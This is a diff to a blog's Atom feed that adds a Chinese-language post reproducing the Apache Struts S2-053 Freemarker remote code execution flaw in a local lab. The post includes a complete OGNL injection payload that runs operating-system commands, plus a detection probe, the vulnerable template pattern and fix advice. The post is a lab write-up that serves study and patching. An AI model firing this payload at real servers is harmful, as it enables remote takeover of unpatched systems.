@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://y-hkl.top/"/>
-  <updated>2017-09-08T08:43:32.134Z</updated>
+  <updated>2017-09-13T07:30:59.809Z</updated>
   <id>http://y-hkl.top/</id>
   
   <author>
@@ -14,6 +14,49 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>s2-053漏洞复现</title>
+    <link href="http://y-hkl.top/2017/09/13/s2-053%E5%A4%8D%E7%8E%B0/"/>
+    <id>http://y-hkl.top/2017/09/13/s2-053复现/</id>
+    <published>2017-09-13T06:54:49.000Z</published>
+    <updated>2017-09-13T07:30:59.809Z</updated>
+    
+    <content type="html"><![CDATA[<p>2017年9月7日，Struts官方发布一个中危的安全漏洞，该漏洞编号为:S2-053,在一定条件下，当开发人员在Freemarker标签中使用错误的构造时，可能会导致远程代码执行漏洞<br><a id="more"></a></p>
+<h2 id="漏洞编号"><a href="#漏洞编号" class="headerlink" title="漏洞编号"></a>漏洞编号</h2><p>CVE-2017-12611</p>
+<h2 id="漏洞名称"><a href="#漏洞名称" class="headerlink" title="漏洞名称"></a>漏洞名称</h2><p>Freemarker标签远程代码执行漏洞</p>
+<h2 id="漏洞评级"><a href="#漏洞评级" class="headerlink" title="漏洞评级"></a>漏洞评级</h2><p>中危</p>
+<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>Struts 2.0.1 - 2.3.33<br>Struts 2.5 - 2.5.10</p>
+<h2 id="s2-053-POC"><a href="#s2-053-POC" class="headerlink" title="s2-053 POC"></a>s2-053 POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">%&#123;(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&apos;com.opensymphony.xwork2.ActionContext.container&apos;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&apos;whoami&apos;).(#iswin=(@java.lang.System@getProperty(&apos;os.name&apos;).toLowerCase().contains(&apos;win&apos;))).(#cmds=(#iswin?&#123;&apos;cmd.exe&apos;,&apos;/c&apos;,#cmd&#125;:&#123;&apos;/bin/bash&apos;,&apos;-c&apos;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))&#125;</div></pre></td></tr></table></figure>
+<p>注意：执行命令的地方在于(#cmd=’whoami’)</p>
+<h2 id="漏洞环境搭建"><a href="#漏洞环境搭建" class="headerlink" title="漏洞环境搭建"></a>漏洞环境搭建</h2><p>可以使用war包或docker复现</p>
+<h3 id="使用war包搭建环境"><a href="#使用war包搭建环境" class="headerlink" title="使用war包搭建环境"></a>使用war包搭建环境</h3><p>下载war包 链接：<a href="http://pan.baidu.com/s/1qXW3FPi" target="_blank" rel="external">http://pan.baidu.com/s/1qXW3FPi</a> 密码：9exb<br>下载后把它放到tomcat目录下的webapps目录下，重启tomcat后访问：<a href="http://127.0.0.1:8080/s2-053" target="_blank" rel="external">http://127.0.0.1:8080/s2-053</a><br><img src="/upload_img/s2_053_1.png" alt=""></p>
+<h3 id="使用docker搭建环境"><a href="#使用docker搭建环境" class="headerlink" title="使用docker搭建环境"></a>使用docker搭建环境</h3><p>快速搭建各种漏洞环境(Various vulnerability environment) <a href="https://github.com/Medicean/VulApps" target="_blank" rel="external">https://github.com/Medicean/VulApps</a><br>搭建好后访问 <a href="http://127.0.0.1:8080/hello.action" target="_blank" rel="external">http://127.0.0.1:8080/hello.action</a><br><img src="/upload_img/s2_053_2.png" alt=""></p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h3><p>打开页面，输入表达式%{33-1}进行测试，发现成功执行，返回32<br><img src="/upload_img/s2_053_3.png" alt=""></p>
+<h3 id="执行POC"><a href="#执行POC" class="headerlink" title="执行POC"></a>执行POC</h3><p>输入POC提交<br><img src="/upload_img/s2_053_4.png" alt=""></p>
+<h3 id="来个调用计算器（calc）"><a href="#来个调用计算器（calc）" class="headerlink" title="来个调用计算器（calc）"></a>来个调用计算器（calc）</h3><p>把(#cmd=’whoami’)里面的whoami缓存calc<br><img src="/upload_img/s2_053_5.png" alt=""></p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>当在Freemarker标签中使用表达式文本或强制表达式时，使用以下请求值可能会导致远程代码执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;@s.hidden </div><div class="line">name=&quot;strutsS&quot; value=strutsS/&gt; </div><div class="line">&lt;@s.hidden name=&quot;strutsS&quot; </div><div class="line">value=&quot;$&#123;strutsS&#125;&quot; /&gt;</div></pre></td></tr></table></figure></p>
+<p>这两种情况下，值属性都使用可写属性，都会受到Freemarker表达式影响</p>
+<h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><p>1.升级到Apache Struts5.12或2.3.34<br>2.Freemarker标签内容不要通过Request方式获取<br>3.使用只读属性来初始化value属性（仅限getter属性）</p>
+<ol>
+<li>不要使用如下结构<br>&lt;@s.hidden name=”redirectUri” value=redirectUri /&gt;<br>&lt;@s.hidden name=”redirectUri” value=”${redirectUri}” /&gt;</li>
+</ol>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;2017年9月7日，Struts官方发布一个中危的安全漏洞，该漏洞编号为:S2-053,在一定条件下，当开发人员在Freemarker标签中使用错误的构造时，可能会导致远程代码执行漏洞&lt;br&gt;
+    
+    </summary>
+    
+      <category term="漏洞复现" scheme="http://y-hkl.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
+    
+    
+      <category term="漏洞" scheme="http://y-hkl.top/tags/%E6%BC%8F%E6%B4%9E/"/>
+    
+      <category term="s2-053" scheme="http://y-hkl.top/tags/s2-053/"/>
+    
+  </entry>
   
   <entry>
     <title>s2-052复现</title>
